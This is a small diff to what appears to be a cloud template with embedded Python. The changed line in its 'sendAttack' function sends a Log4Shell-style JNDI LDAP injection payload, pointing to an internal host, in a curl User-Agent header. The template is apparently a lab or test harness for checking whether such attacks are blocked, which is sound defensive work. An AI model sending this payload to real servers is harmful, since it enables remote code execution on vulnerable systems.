@@ -214,7 +214,7 @@ Resources:
               return curl("curl -m {} {}".format(timeout, server).split(' '))
 
           def sendAttack(server, timeout=2):
-              return curl("curl -m {} -H 'User-Agent: ${{jndi:ldap://10.0.51.1:13/a}}' {}/cmd.exe".format(timeout, server).split(' '))
+              return curl("curl -m {} -H 'User-Agent:${{jndi:ldap://10.0.51.1:13/a}}' {}/cmd.exe".format(timeout, server).split(' '))
               # return curl("curl --connect-timeout {} {}".format(timeout, server).split(' '))  
           def curl(cmd):
               # Returns True if was able to connect to server
